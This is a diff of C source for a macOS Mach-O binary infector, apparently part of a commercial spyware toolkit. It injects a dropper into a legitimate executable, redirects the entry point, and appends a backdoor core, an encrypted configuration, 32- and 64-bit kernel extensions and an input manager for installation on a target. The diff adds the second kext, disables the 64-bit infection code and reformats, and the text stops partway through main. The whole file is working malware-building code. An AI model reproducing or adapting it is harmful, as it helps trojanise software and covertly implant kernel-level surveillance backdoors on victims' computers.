@@ -58,9 +58,9 @@
 
 //static unsigned int paddedPagezeroVASize = 0;
 
-#define ENTRY_POINT				    ((byte *)secondStageDropper - (byte *)dropperStart)
-#define DROPPER_CODE_SIZE		  ((byte *)dropperEnd - (byte *)dropperStart)
-#define FIRST_STAGE_CODE_SIZE	((byte *)firstStageDropper - (byte *)labelTest)
+#define ENTRY_POINT            ((byte *)secondStageDropper - (byte *)dropperStart)
+#define DROPPER_CODE_SIZE      ((byte *)dropperEnd - (byte *)dropperStart)
+#define FIRST_STAGE_CODE_SIZE  ((byte *)firstStageDropper - (byte *)labelTest)
 
 uint32_t gShiftSize = 0;
 uint32_t gOutSize   = 0;
@@ -100,7 +100,7 @@ uint32_t getBinaryEP_32 (byte *machoBase)
   
   return -1;
 }
-
+#if 0
 uint64_t getBinaryEP_64 (byte *machoBase)
 {
   struct mach_header_64 *m_header;
@@ -136,7 +136,7 @@ uint64_t getBinaryEP_64 (byte *machoBase)
   
   return -1;
 }
-
+#endif
 int
 setBinaryEP_32 (byte *machoBase, uint32_t anEntryPoint)
 {
@@ -176,7 +176,7 @@ setBinaryEP_32 (byte *machoBase, uint32_t anEntryPoint)
   
   return -1;
 }
-
+#if 0
 int
 setBinaryEP_64 (byte *machoBase, uint64_t anEntryPoint)
 {
@@ -213,7 +213,7 @@ setBinaryEP_64 (byte *machoBase, uint64_t anEntryPoint)
   
   return -1;
 }
-
+#endif
 int appendData (char *inputFilePointer,
                 char *outputFilePointer,
                 int inArchOffset,
@@ -239,15 +239,12 @@ int appendData (char *inputFilePointer,
   stringTable     strings;
   resourceHeader  resource;
   
-  if (gKextFileSize > 0)
-    numberOfResources = 5;
-  else
-    numberOfResources = 4;
+  numberOfResources = 6;
   
   //if (is64bitArch)
   //  originalEP = getBinaryEP_64 ((byte *)(inputFilePointer + inArchOffset));
   //else
-    originalEP = getBinaryEP_32 ((byte *)(inputFilePointer + inArchOffset));
+  originalEP = getBinaryEP_32 ((byte *)(inputFilePointer + inArchOffset));
 
 #ifdef DEBUG
   printf ("Original EP: %x\n", originalEP);
@@ -255,7 +252,8 @@ int appendData (char *inputFilePointer,
 
   char *coreFileName          = basename(coreFilePath);
   char *confFileName          = basename(confFilePath);
-  char *kextFileName          = basename(kextFilePath);
+  char *kext32FileName        = basename(kext32FilePath);
+  char *kext64FileName        = basename(kext64FilePath);
   char *inputManagerFileName  = basename(inputManagerFilePath);
   char *iconFileName          = basename(iconFilePath);
   char *inputFileName         = basename(inputFilePath);
@@ -264,21 +262,21 @@ int appendData (char *inputFilePointer,
   //
   // Set the infection header
   //
-  memset (&infection, 0, sizeof (infectionHeader));
+  memset(&infection, 0, sizeof (infectionHeader));
   infection.numberOfResources = numberOfResources;
   infection.numberOfStrings   = gNumStrings;
   infection.dropperSize       = (int)DROPPER_CODE_SIZE;
   infection.originalEP        = originalEP; //+ paddedPagezeroVASize - PAGE_ALIGNMENT;
   
-  memcpy (outputFilePointer + offset, &infection, sizeof (infectionHeader));
-  offset += sizeof (infectionHeader);
+  memcpy(outputFilePointer + offset, &infection, sizeof (infectionHeader));
+  offset += sizeof(infectionHeader);
 
   //
   // Set the string table
   //
   for (z = 0; z < gNumStrings; z++)
     {
-      memset (&strings, 0, sizeof (stringTable));
+      memset(&strings, 0, sizeof (stringTable));
 #ifdef WIN32
       strncpy_s(strings.value, sizeof(strings.value), _strings[z], _TRUNCATE);
 #else
@@ -290,13 +288,14 @@ int appendData (char *inputFilePointer,
 #endif
       strings.type = STRING_DATA;
       
-      memcpy (outputFilePointer + offset, &strings, sizeof (stringTable));
-      offset += sizeof (stringTable);
+      memcpy(outputFilePointer + offset, &strings, sizeof (stringTable));
+      offset += sizeof(stringTable);
     }
   
   // Set the new EP + 4 (number of Resources)
   if (is64bitArch)
     {
+#if 0
       if (setBinaryEP_64 ((byte *)(outputFilePointer + outArchOffset),
                           segmentVMAddr
                           + sizeof (infectionHeader)
@@ -305,11 +304,12 @@ int appendData (char *inputFilePointer,
           printf ("[ee] An error occurred while setting the new EP\n");
           exit (1);
         }
+#endif
     }
   else
     {
-      if (setBinaryEP_32 ((byte *)(outputFilePointer + outArchOffset),
-                          (uint32_t)segmentVMAddr
+      if (setBinaryEP_32((byte *)(outputFilePointer + outArchOffset),
+                         (uint32_t)segmentVMAddr
                           + sizeof (infectionHeader)
                           + sizeof (stringTable) * gNumStrings) == -1)
         {
@@ -321,64 +321,64 @@ int appendData (char *inputFilePointer,
   //
   // Now append the crt start routine (__malloc_initialize error fix)
   //
-  memcpy (outputFilePointer + offset, crtStart, sizeof (crtStart));
+  memcpy(outputFilePointer + offset, crtStart, sizeof (crtStart));
   offset += sizeof (crtStart);
   
   unsigned int ep = (unsigned int)ENTRY_POINT;
 #ifdef DEBUG_VERBOSE
   printf ("ep: %x\n", ep);
 #endif
-  memmove (outputFilePointer + offset - 1, &ep, 3);
+  memmove(outputFilePointer + offset - 1, &ep, 3);
   offset += 3;
   
   //
   // Now append our loader
   //
-  memcpy (outputFilePointer + offset,
-          dropperStart,
-          (_mSize_t)DROPPER_CODE_SIZE);
+  memcpy(outputFilePointer + offset,
+         dropperStart,
+         (_mSize_t)DROPPER_CODE_SIZE);
   
-  offset += (int) DROPPER_CODE_SIZE;
+  offset += (int)DROPPER_CODE_SIZE;
   
   //
   // Now resourceHeader with all the files which needs to be dropped
   //
-  printf ("[ii] Dropper injected (%d)\n", (int) DROPPER_CODE_SIZE);
+  printf("[ii] Dropper injected (%d)\n", (int)DROPPER_CODE_SIZE);
   
   //
   // CORE
   //
   resource.type = RESOURCE_CORE;
-  memset (resource.name, 0, strlen (resource.name));
-  memcpy (resource.name, coreFileName, sizeof (resource.name));
+  memset(resource.name, 0, strlen(resource.name));
+  memcpy(resource.name, coreFileName, sizeof(resource.name));
   
   resource.size = gCoreFileSize;
   
-  memset (resource.path, 0, strlen (resource.path));
-  memcpy (resource.path, installPath, sizeof (resource.path));
+  memset(resource.path, 0, strlen(resource.path));
+  memcpy(resource.path, installPath, sizeof(resource.path));
   
-  memcpy (outputFilePointer + offset,
-          &resource,
-          sizeof (resourceHeader));
+  memcpy(outputFilePointer + offset,
+         &resource,
+         sizeof(resourceHeader));
   
-  offset += sizeof (resourceHeader);
+  offset += sizeof(resourceHeader);
 
 #ifdef WIN32
-  if ((tempFilePointer = mapFile (coreFilePath, &tempFileSize,
-                                  &tempFD, &tempFDMap, 0)) == NULL)
+  if ((tempFilePointer = mapFile(coreFilePath, &tempFileSize,
+                                 &tempFD, &tempFDMap, 0)) == NULL)
 
 #else
-  if ((tempFilePointer = mapFile (coreFilePath, &tempFileSize,
-                                  &tempFD, 0)) == NULL)
+  if ((tempFilePointer = mapFile(coreFilePath, &tempFileSize,
+                                 &tempFD, 0)) == NULL)
 #endif
     {
       printf("[ee] Error while mmapping the backdoor core file\n");
       exit (1);
     }
 
-  memcpy (outputFilePointer + offset,
-          tempFilePointer,
-          gCoreFileSize);
+  memcpy(outputFilePointer + offset,
+         tempFilePointer,
+         gCoreFileSize);
   offset += gCoreFileSize;
   
   tempFileSize = 0;
@@ -398,33 +398,33 @@ int appendData (char *inputFilePointer,
   // CONF
   //
   resource.type = RESOURCE_CONF;
-  memset (resource.name, 0, sizeof (resource.name));
-  memcpy (resource.name, confFileName, sizeof (resource.name));
+  memset(resource.name, 0, sizeof(resource.name));
+  memcpy(resource.name, confFileName, sizeof(resource.name));
   resource.size = gConfFileSize;
-  memset (resource.path, 0, sizeof (resource.path));
-  memcpy (resource.path, installPath, sizeof (resource.path));
+  memset(resource.path, 0, sizeof(resource.path));
+  memcpy(resource.path, installPath, sizeof(resource.path));
   
-  memcpy (outputFilePointer + offset,
-          &resource,
-          sizeof (resourceHeader));
+  memcpy(outputFilePointer + offset,
+         &resource,
+         sizeof(resourceHeader));
   
-  offset += sizeof (resourceHeader);
+  offset += sizeof(resourceHeader);
 #ifdef WIN32
-  if ((tempFilePointer = mapFile (confFilePath, &tempFileSize,
-                                  &tempFD, &tempFDMap, 0)) == NULL)
+  if ((tempFilePointer = mapFile(confFilePath, &tempFileSize,
+                                 &tempFD, &tempFDMap, 0)) == NULL)
 
 #else 
-  if ((tempFilePointer = mapFile (confFilePath, &tempFileSize,
-                                  &tempFD, 0)) == NULL)
+  if ((tempFilePointer = mapFile(confFilePath, &tempFileSize,
+                                 &tempFD, 0)) == NULL)
 #endif
     {
       printf("[ee] Error while mmapping the configuration file\n");
-      exit (1);
+      exit(1);
     }
 
-  memcpy (outputFilePointer + offset,
-          tempFilePointer,
-          gConfFileSize);
+  memcpy(outputFilePointer + offset,
+         tempFilePointer,
+         gConfFileSize);
   offset += gConfFileSize;
 
   tempFileSize = 0;
@@ -436,66 +436,113 @@ int appendData (char *inputFilePointer,
   CloseHandle(tempFDMap);
   CloseHandle(tempFD);
 #else
-  close (tempFD);
+  close(tempFD);
 
   tempFilePointer = NULL;
 #endif
 
   //
-  // KEXT
+  // KEXT32
   //
-  if (gKextFileSize > 0)
-    {
-      resource.type = RESOURCE_KEXT;
-      memset (resource.name, 0, sizeof (resource.name));
-      memcpy (resource.name, kextFileName, sizeof (resource.name));
-      resource.size = gKextFileSize;
-      memset (resource.path, 0, sizeof (resource.path));
-      memcpy (resource.path, installPath, sizeof (resource.path));
+  resource.type = RESOURCE_KEXT;
+  memset(resource.name, 0, sizeof(resource.name));
+  memcpy(resource.name, kext32FileName, sizeof(resource.name));
+  resource.size = gKext32FileSize;
+  memset(resource.path, 0, sizeof(resource.path));
+  memcpy(resource.path, installPath, sizeof(resource.path));
 
 #ifdef DEBUG
-      printf ("offset: %x\n", offset);
+  printf ("offset: %x\n", offset);
 #endif
 
-      memcpy (outputFilePointer + offset,
-              &resource,
-              sizeof (resourceHeader));
+  memcpy(outputFilePointer + offset,
+         &resource,
+         sizeof(resourceHeader));
       
-      offset += sizeof (resourceHeader);
+  offset += sizeof(resourceHeader);
 
 #ifdef WIN32
-	    if ((tempFilePointer = mapFile (kextFilePath, &tempFileSize,
-			                  						  &tempFD, &tempFDMap, 0)) == NULL)
-
+	if ((tempFilePointer = mapFile(kext32FilePath, &tempFileSize,
+			                  				&tempFD, &tempFDMap, 0)) == NULL)
 #else
-      if ((tempFilePointer = mapFile (kextFilePath, &tempFileSize,
-                                      &tempFD, 0)) == NULL)
+  if ((tempFilePointer = mapFile(kext32FilePath, &tempFileSize,
+                                 &tempFD, 0)) == NULL)
 #endif
-        {
-          printf("[ee] Error while mmapping the configuration file\n");
-          exit (1);
-        }
-
-      memcpy (outputFilePointer + offset,
-              tempFilePointer,
-              gKextFileSize);
-      
-      offset += gKextFileSize;
-      tempFileSize = 0;
-
-#ifdef WIN32
-      if (tempFilePointer != NULL)
-        UnmapViewOfFile (tempFilePointer);
-
-      CloseHandle (tempFDMap);
-      CloseHandle (tempFD);
-#else
-      close (tempFD);
-
-      tempFilePointer = NULL;
-#endif
+    {
+      printf("[ee] Error while mmapping the configuration file\n");
+      exit(1);
     }
+
+  memcpy(outputFilePointer + offset,
+         tempFilePointer,
+         gKext32FileSize);
+      
+  offset += gKext32FileSize;
+  tempFileSize = 0;
+
+#ifdef WIN32
+  if (tempFilePointer != NULL)
+    UnmapViewOfFile(tempFilePointer);
+
+  CloseHandle(tempFDMap);
+  CloseHandle(tempFD);
+#else
+  close(tempFD);
+
+  tempFilePointer = NULL;
+#endif
   
+  //
+  // KEXT64
+  //
+  resource.type = RESOURCE_KEXT;
+  memset(resource.name, 0, sizeof(resource.name));
+  memcpy(resource.name, kext64FileName, sizeof(resource.name));
+  resource.size = gKext64FileSize;
+  memset(resource.path, 0, sizeof(resource.path));
+  memcpy(resource.path, installPath, sizeof(resource.path));
+
+#ifdef DEBUG
+  printf ("offset: %x\n", offset);
+#endif
+
+  memcpy(outputFilePointer + offset,
+         &resource,
+         sizeof (resourceHeader));
+      
+  offset += sizeof(resourceHeader);
+
+#ifdef WIN32
+	if ((tempFilePointer = mapFile (kext64FilePath, &tempFileSize,
+			                  					&tempFD, &tempFDMap, 0)) == NULL)
+#else
+  if ((tempFilePointer = mapFile (kext64FilePath, &tempFileSize,
+                                  &tempFD, 0)) == NULL)
+#endif
+    {
+      printf("[ee] Error while mmapping the configuration file\n");
+      exit (1);
+    }
+
+  memcpy (outputFilePointer + offset,
+          tempFilePointer,
+          gKext64FileSize);
+      
+  offset += gKext64FileSize;
+  tempFileSize = 0;
+
+#ifdef WIN32
+  if (tempFilePointer != NULL)
+    UnmapViewOfFile (tempFilePointer);
+
+  CloseHandle (tempFDMap);
+  CloseHandle (tempFD);
+#else
+  close (tempFD);
+
+  tempFilePointer = NULL;
+#endif
+
   //
   // INPUT MANAGER
   //
@@ -899,9 +946,9 @@ int infectSingleArch (char *inputFilePointer,
   // Now the rest of the file (data), here we wanna skip sizeof segment_command
   // in order to leave the file padded correctly for its TEXT segment
   //
-  memcpy (outputFilePointer + outputOffset,
-          inputFilePointer + inputOffset + sizeof (struct segment_command),
-          inputFileSize - (inputOffset - inOffsetToArch) - sizeof (struct segment_command));
+  memcpy(outputFilePointer + outputOffset,
+         inputFilePointer + inputOffset + sizeof (struct segment_command),
+         inputFileSize - (inputOffset - inOffsetToArch) - sizeof (struct segment_command));
   
   free (m_header);
   printf ("[ii] LoadCommands copied successfully\n");
@@ -915,18 +962,18 @@ int infectSingleArch (char *inputFilePointer,
   printf ("inputSize + padding: %d\n", inputFileSize + padding);
 #endif
   
-  if (appendData (inputFilePointer,
-                  outputFilePointer,
-                  inOffsetToArch,
-                  outOffsetToArch,
-                  inputFileSize + padding,
-                  segVMAddr,
-                  false) != kErrorGeneric)
+  if (appendData(inputFilePointer,
+                 outputFilePointer,
+                 inOffsetToArch,
+                 outOffsetToArch,
+                 inputFileSize + padding,
+                 segVMAddr,
+                 false) != kErrorGeneric)
     return padding;
   else
     return kErrorGeneric;
 }
-
+#if 0
 int infectSingleArch64 (char *inputFilePointer,
                         char *outputFilePointer,
                         int inOffsetToArch,
@@ -943,14 +990,14 @@ int infectSingleArch64 (char *inputFilePointer,
   uint32_t inputOffset  = 0;
   uint32_t outputOffset = 0;
   uint32_t segVMAddr    = 0;
-  int displacement          = 0;
-  int padding               = 0;
+  int displacement      = 0;
+  int padding           = 0;
   
   inputOffset   += inOffsetToArch;
   outputOffset  += outOffsetToArch;
   
   m_header =  (struct mach_header_64 *) allocate (sizeof (struct mach_header_64));
-  memcpy (m_header, inputFilePointer + inputOffset, sizeof (struct mach_header_64));
+  memcpy(m_header, inputFilePointer + inputOffset, sizeof (struct mach_header_64));
   
   // TODO: Add check for cputype as well
   if (m_header->filetype != MH_EXECUTE)
@@ -965,7 +1012,7 @@ int infectSingleArch64 (char *inputFilePointer,
   m_header->sizeofcmds += sizeof (struct segment_command_64);
   m_header->ncmds      += 1;
   
-  memcpy (outputFilePointer + outputOffset, m_header, sizeof (struct mach_header_64));
+  memcpy(outputFilePointer + outputOffset, m_header, sizeof (struct mach_header_64));
   
   // Calculate padding including loader code size
   displacement  = inputFileSize % PAGE_ALIGNMENT;
@@ -1244,23 +1291,23 @@ int infectSingleArch64 (char *inputFilePointer,
   printf ("inputSize + padding: %d\n", inputFileSize + padding);
 #endif
   
-  if (appendData (inputFilePointer,
-                  outputFilePointer,
-                  inOffsetToArch,
-                  outOffsetToArch,
-                  inputFileSize + padding,
-                  segVMAddr,
-                  true) != kErrorGeneric)
+  if (appendData(inputFilePointer,
+                 outputFilePointer,
+                 inOffsetToArch,
+                 outOffsetToArch,
+                 inputFileSize + padding,
+                 segVMAddr,
+                 true) != kErrorGeneric)
     return padding;
   else
     return kErrorGeneric;
 }
-
+#endif
 int
-getBinaryFormat (char *aFilePointer)
+getBinaryFormat(char *aFilePointer)
 {
-  memset (&gFatHeader, 0, sizeof (gFatHeader));
-  memcpy (&gFatHeader, aFilePointer, sizeof (gFatHeader));
+  memset(&gFatHeader, 0, sizeof (gFatHeader));
+  memcpy(&gFatHeader, aFilePointer, sizeof (gFatHeader));
   
   switch (gFatHeader.magic)
     {
@@ -1275,11 +1322,11 @@ getBinaryFormat (char *aFilePointer)
     }
 }
 
-int getFileSize (char *aFilePath)
+int getFileSize(char *aFilePath)
 {
   struct stat sb;
   
-  if (stat (aFilePath, &sb) == kErrorGeneric)
+  if (stat(aFilePath, &sb) == kErrorGeneric)
     {
       return kErrorGeneric;
     }
@@ -1288,27 +1335,28 @@ int getFileSize (char *aFilePath)
 }
 
 void
-usage (_mChar *aBinaryName)
+usage(_mChar *aBinaryName)
 {
 #ifdef WIN32
-	printf ("\nUsage: %S <core> <conf> <kext> <imanager> <icon> <path> <input> <output>\n\n", aBinaryName);
+	printf("\nUsage: %S <core> <conf> <kext32> <kext64> <imanager> <icon> <dirname> <input> <output>\n\n", aBinaryName);
 #else
-  printf ("\nUsage: %s <core> <conf> <kext> <path> <input> <output>\n\n", aBinaryName);
+  printf("\nUsage: %s <core> <conf> <kext32> <kext64> <dirname> <input> <output>\n\n", aBinaryName);
 #endif
-  printf ("\t<core>     : backdoor core\n");
-  printf ("\t<conf>     : backdoor encrypted configuration\n");
-  printf ("\t<kext>     : kernel extension\n");
-  printf ("\t<imanager> : input manager\n");
-  printf ("\t<icon>     : icon\n");
-  printf ("\t<path>     : backdoor installation path (on target)\n");
-  printf ("\t<input>    : binary to melt with\n");
-  printf ("\t<output>   : output filename\n\n");
+  printf("\t<core>     : backdoor core\n");
+  printf("\t<conf>     : backdoor encrypted configuration\n");
+  printf("\t<kext32>   : kernel extension 32bit\n");
+  printf("\t<kext64>   : kernel extension 64bit\n");
+  printf("\t<imanager> : input manager\n");
+  printf("\t<icon>     : icon\n");
+  printf("\t<dirname>  : backdoor dir name\n");
+  printf("\t<input>    : binary to melt with\n");
+  printf("\t<output>   : output filename\n\n");
 }
 
 int
-parseArguments (int argc, _mChar **argv)
+parseArguments(int argc, _mChar **argv)
 {
-	if (argc != 9)
+	if(argc != 10)
     {
       return kErrorGeneric;
     }
@@ -1331,12 +1379,13 @@ parseArguments (int argc, _mChar **argv)
 
   coreFilePath          = argv[1];
   confFilePath          = argv[2];
-  kextFilePath          = argv[3];
-  inputManagerFilePath  = argv[4];
-  iconFilePath          = argv[5];
-  installPath           = argv[6];
-  inputFilePath         = argv[7];
-  outputFilePath        = argv[8];
+  kext32FilePath        = argv[3];
+  kext64FilePath        = argv[4];
+  inputManagerFilePath  = argv[5];
+  iconFilePath          = argv[6];
+  installPath           = argv[7];
+  inputFilePath         = argv[8];
+  outputFilePath        = argv[9];
 
   return kSuccess;
 }
@@ -1348,8 +1397,10 @@ void freeArguments()
 		free(coreFilePath);
 	if (confFilePath != NULL)
 		free(confFilePath);
-	if (kextFilePath != NULL)
-		free(kextFilePath);
+	if (kext32FilePath != NULL)
+		free(kext32FilePath);
+  if (kext64FilePath != NULL)
+		free(kext64FilePath);
 	if (installPath != NULL)
 		free(installPath);
 	if (inputFilePath != NULL)
@@ -1360,7 +1411,7 @@ void freeArguments()
 #endif
 
 int
-main (int argc, _mChar *argv[])
+main(int argc, _mChar *argv[])
 {
   struct fat_arch *f_arch;
   char *inputFilePointer      = NULL;
@@ -1395,7 +1446,7 @@ main (int argc, _mChar *argv[])
   // Check if the backdoor, configuration file and KEXT exists and get
   // their size
   //
-  if ((gCoreFileSize = getFileSize (coreFilePath)) == kErrorGeneric)
+  if ((gCoreFileSize = getFileSize(coreFilePath)) == kErrorGeneric)
     {
       printf ("[ee] Core backdoor file not found\n");
 #ifdef WIN32
@@ -1404,7 +1455,7 @@ main (int argc, _mChar *argv[])
       exit (1);
     }
   
-  if ((gConfFileSize = getFileSize (confFilePath)) == kErrorGeneric)
+  if ((gConfFileSize = getFileSize(confFilePath)) == kErrorGeneric)
     {
       printf ("[ee] Configuration file not found\n");
 #ifdef WIN32
@@ -1413,31 +1464,34 @@ main (int argc, _mChar *argv[])
       exit (1);
     }
   
-  if (strncmp ("null", kextFilePath, strlen ("null")) != 0)
+  if ((gKext32FileSize = getFileSize(kext32FilePath)) == kErrorGeneric)
     {
-      if ((gKextFileSize = getFileSize (kextFilePath)) == kErrorGeneric)
-        {
-          printf ("[ee] KEXT file not found\n");
+      printf ("[ee] KEXT32 file not found\n");
 #ifdef WIN32
-          //freeArguments();
+      //freeArguments();
 #endif
-          exit (1);
-        }
+      exit (1);
     }
 
-  if (strncmp ("null", inputManagerFilePath, strlen ("null")) != 0)
+  if ((gKext64FileSize = getFileSize(kext64FilePath)) == kErrorGeneric)
     {
-      if ((gInputManagerFileSize = getFileSize (inputManagerFilePath)) == kErrorGeneric)
-        {
-          printf ("[ee] InputManager file not found\n");
+      printf ("[ee] KEXT64 file not found\n");
 #ifdef WIN32
-          //freeArguments();
+      //freeArguments();
 #endif
-          exit (1);
-        }
+      exit (1);
     }
 
-  if ((gIconFileSize = getFileSize (iconFilePath)) == kErrorGeneric)
+  if ((gInputManagerFileSize = getFileSize(inputManagerFilePath)) == kErrorGeneric)
+    {
+      printf ("[ee] InputManager file not found\n");
+#ifdef WIN32
+      //freeArguments();
+#endif
+      exit (1);
+    }
+
+  if ((gIconFileSize = getFileSize(iconFilePath)) == kErrorGeneric)
     {
       printf ("[ee] Icon file not found\n");
 #ifdef WIN32
@@ -1448,15 +1502,15 @@ main (int argc, _mChar *argv[])
 
   // Map input file
 #ifdef WIN32
-  if ((inputFilePointer = mapFile (inputFilePath,
-                                   &gInputFileSize,
-                                   &inputFD,
-                                   &inputFDMap,
-                                   0)) == NULL)
+  if ((inputFilePointer = mapFile(inputFilePath,
+                                  &gInputFileSize,
+                                  &inputFD,
+                                  &inputFDMap,
+                                  0)) == NULL)
 
 #else
-  if ((inputFilePointer = mapFile (inputFilePath, &gInputFileSize,
-                                   &inputFD, 0, 0)) == NULL)
+  if ((inputFilePointer = mapFile(inputFilePath, &gInputFileSize,
+                                  &inputFD, 0, 0)) == NULL)
 #endif
 	{
       printf("[ee] Error while mmapping the input file\n");
@@ -1472,15 +1526,16 @@ main (int argc, _mChar *argv[])
                     + sizeof (int)
                     + gCoreFileSize
                     + gConfFileSize
-                    + gKextFileSize
+                    + gKext32FileSize
+                    + gKext64FileSize
                     + gInputManagerFileSize
                     + gIconFileSize
                     + sizeof (infectionHeader)
                     + sizeof (stringTable) * gNumStrings
-                    + sizeof (resourceHeader) * ((gKextFileSize > 0) ? 5 : 4);
+                    + sizeof (resourceHeader) * 6;
 
 #ifdef DEBUG_VERBOSE
-  printf ("unpadded outSize: %d\n", outputFileSize);
+  printf("unpadded outSize: %d\n", outputFileSize);
 #endif
   
   if (outputFileSize % PAGE_ALIGNMENT)
@@ -1491,23 +1546,24 @@ main (int argc, _mChar *argv[])
   int tempSize = outputFileSize + gInputFileSize;
   
 #ifdef DEBUG_VERBOSE
-  printf ("padded outSize: %d\n", outputFileSize);
-  printf ("tempSize: %d\n", tempSize);
-  printf ("[ii] loaderCodeSize: %d\n", DROPPER_CODE_SIZE);
-  printf ("[ii] gCoreFileSize: %d\n", gCoreFileSize);
-  printf ("[ii] confCodeSize: %d\n", gConfFileSize);
-  printf ("[ii] gKextFileSize: %d\n", gKextFileSize);
-  printf ("[ii] inputFileSize: %d\n", gInputFileSize);
-  printf ("[ii] outputFileSize: %d\n", outputFileSize);
+  printf("padded outSize: %d\n", outputFileSize);
+  printf("tempSize: %d\n", tempSize);
+  printf("[ii] loaderCodeSize: %d\n", DROPPER_CODE_SIZE);
+  printf("[ii] gCoreFileSize: %d\n", gCoreFileSize);
+  printf("[ii] confCodeSize: %d\n", gConfFileSize);
+  printf("[ii] gKext32FileSize: %d\n", gKext32FileSize);
+  printf("[ii] gKext64FileSize: %d\n", gKext64FileSize);
+  printf("[ii] inputFileSize: %d\n", gInputFileSize);
+  printf("[ii] outputFileSize: %d\n", outputFileSize);
 #endif
   
   // Map output file
 #ifdef WIN32
-  if ((outputFilePointer = mapFile (outputFilePath,
-                                    &tempSize,
-                                    &outputFD,
-                                    &outputFDMap,
-                                    &padding)) == NULL)
+  if ((outputFilePointer = mapFile(outputFilePath,
+                                   &tempSize,
+                                   &outputFD,
+                                   &outputFDMap,
+                                   &padding)) == NULL)
 #else
   if ((outputFilePointer = mapFile (outputFilePath, &tempSize,
                                     &outputFD, 0, &padding)) == NULL)
@@ -1566,38 +1622,38 @@ main (int argc, _mChar *argv[])
 #endif
 
   // Gettin filetype - Compatibility with MacOS X Leopard 10.5
-  fileType = getBinaryFormat (inputFilePointer);
+  fileType = getBinaryFormat(inputFilePointer);
 
   switch (fileType)
     {
     case kFatBinary:
       {
-        gFileType     = 1;
-        int x86Found  = 0;
-        int otherFound    = 0;
+        gFileType       = 1;
+        int x86Found    = 0;
+        int otherFound  = 0;
 
         gFileType = 1;
         nfat = gFatHeader.nfat_arch;
         int fArchSize = 0;
 
-        printf ("[ii] FAT Binary found\n");
-        printf ("[ii] Found %d Arch(s)\n", nfat);
+        printf("[ii] FAT Binary found\n");
+        printf("[ii] Found %d Arch(s)\n", nfat);
 
         if (nfat > 4)
           {
-            printf ("[ii] Error: unsupported format (too many archs)\n");
+            printf("[ii] Error: unsupported format (too many archs)\n");
             
             return kErrorGeneric;
           }
 
-        //memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
-        //outputOffset  += sizeof (gFatHeader);
-        inputOffset   += sizeof (gFatHeader);
+        //memcpy(outputFilePointer, &gFatHeader, sizeof (gFatHeader));
+        //outputOffset  += sizeof(gFatHeader);
+        inputOffset   += sizeof(gFatHeader);
 
         for (i = 0; i < nfat; i++)
           {
-            f_arch = (fat_arch *) allocate (sizeof (struct fat_arch));
-            memcpy (f_arch, inputFilePointer + inputOffset, sizeof (struct fat_arch));
+            f_arch = (fat_arch *)allocate(sizeof(struct fat_arch));
+            memcpy(f_arch, inputFilePointer + inputOffset, sizeof(struct fat_arch));
 
             cputype       = f_arch->cputype;
             archOffset    = f_arch->offset;
@@ -1619,21 +1675,21 @@ main (int argc, _mChar *argv[])
                       arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
                   }
 
-                offsetToResources = infectSingleArch ((char *)(inputFilePointer),
-                                                      (char *)(outputFilePointer),
-                                                      archOffset,
-                                                      0,//arch_offt_padded,
-                                                      fArchSize,
-                                                      outputFileSize);
+                offsetToResources = infectSingleArch((char *)(inputFilePointer),
+                                                     (char *)(outputFilePointer),
+                                                     archOffset,
+                                                     0,//arch_offt_padded,
+                                                     fArchSize,
+                                                     outputFileSize);
 
-                gShiftSize += sizeof (struct segment_command)
+                gShiftSize += sizeof(struct segment_command)
                               + outputFileSize
                               + offsetToResources;
                 
 #ifdef DEBUG
                 printf("offsetToRes: %d\n", offsetToResources);
 #endif
-                fArchSize += sizeof (struct segment_command)
+                fArchSize += sizeof(struct segment_command)
                              + outputFileSize
                              + offsetToResources;
                 f_arch->size = fArchSize;
@@ -1655,14 +1711,14 @@ main (int argc, _mChar *argv[])
                       arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
                   }
 
-                offsetToResources = infectSingleArch64 ((char *)(inputFilePointer),
-                                                        (char *)(outputFilePointer),
-                                                        archOffset,
-                                                        arch_offt_padded,
-                                                        fArchSize,
-                                                        outputFileSize);
+                offsetToResources = infectSingleArch64((char *)(inputFilePointer),
+                                                       (char *)(outputFilePointer),
+                                                       archOffset,
+                                                       arch_offt_padded,
+                                                       fArchSize,
+                                                       outputFileSize);
 
-                gShiftSize += sizeof (struct segment_command)
+                gShiftSize += sizeof(struct segment_command)
                               + outputFileSize
                               + offsetToResources;
                 
@@ -1670,7 +1726,7 @@ main (int argc, _mChar *argv[])
                 printf("offsetToRes: %d\n", offsetToResources);
 #endif
                 
-                fArchSize += sizeof (struct segment_command)
+                fArchSize += sizeof(struct segment_command)
                              + outputFileSize
                              + offsetToResources;
                 f_arch->size = fArchSize;
@@ -1694,16 +1750,16 @@ main (int argc, _mChar *argv[])
 
                 f_arch->offset = arch_offt_padded;
 
-                memcpy (outputFilePointer + arch_offt_padded,
-                        inputFilePointer + archOffset,
-                        fArchSize);
+                memcpy(outputFilePointer + arch_offt_padded,
+                       inputFilePointer + archOffset,
+                       fArchSize);
               }
             
-            memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));
+            memcpy(outputFilePointer + outputOffset, f_arch, sizeof(struct fat_arch));
             */
             free (f_arch);
-            inputOffset   += sizeof (struct fat_arch);
-            outputOffset  += sizeof (struct fat_arch);
+            inputOffset   += sizeof(struct fat_arch);
+            outputOffset  += sizeof(struct fat_arch);
           }
 
         break;
@@ -1714,7 +1770,7 @@ main (int argc, _mChar *argv[])
         int otherFound    = 0;
 
         gFileType = 2;
-        nfat = SWAP_LONG (gFatHeader.nfat_arch);
+        nfat = SWAP_LONG(gFatHeader.nfat_arch);
         int fArchSize = 0;
 
         printf ("[ii] FAT (swapped) Binary found\n");
@@ -1729,16 +1785,16 @@ main (int argc, _mChar *argv[])
 
         //memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
         //outputOffset  += sizeof (gFatHeader);
-        inputOffset   += sizeof (gFatHeader);
+        inputOffset   += sizeof(gFatHeader);
         
         for (i = 0; i < nfat; i++)
           {
-            f_arch = (fat_arch *) allocate (sizeof (struct fat_arch));
-            memcpy (f_arch, inputFilePointer + inputOffset, sizeof (struct fat_arch));
+            f_arch = (fat_arch *)allocate(sizeof(struct fat_arch));
+            memcpy(f_arch, inputFilePointer + inputOffset, sizeof(struct fat_arch));
             
-            cputype       = SWAP_LONG (f_arch->cputype);
-            archOffset    = SWAP_LONG (f_arch->offset);
-            fArchSize     = SWAP_LONG (f_arch->size);
+            cputype       = SWAP_LONG(f_arch->cputype);
